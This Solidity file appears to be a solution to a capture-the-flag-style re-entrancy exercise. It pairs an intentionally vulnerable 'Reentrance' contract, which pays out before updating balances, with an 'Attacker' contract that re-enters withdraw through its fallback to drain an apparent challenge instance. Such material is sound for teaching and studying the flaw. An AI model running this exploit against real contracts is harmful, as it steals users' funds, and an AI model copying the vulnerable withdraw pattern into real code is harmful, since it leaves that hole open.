pragma solidity ^0.4.19;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}

contract Attacker{
    address instance_address = 0x06a471a459872924917208ee1422a57a99fd1c9d;
    Reentrance target = Reentrance(instance_address);
    uint have_withdraw = 0;
    
    function Attacker() payable {}
    
    function get_balance() public view returns (uint){
        return target.balanceOf(this);
    }
    
    function get_balance_ins() public view returns (uint){
        return instance_address.balance;
    }
    
    function get_balance_my() public view returns (uint){
        return address(this).balance;
    }
    
    function donate() public payable{
        target.donate.value(1 ether)(this);
    }
    
    function() payable{
        if (have_withdraw == 0 && msg.sender == instance_address){
            have_withdraw = 1;
            target.withdraw(1 ether);
        }
    }
    
    function hack(){
        target.withdraw(1 ether);
    }
}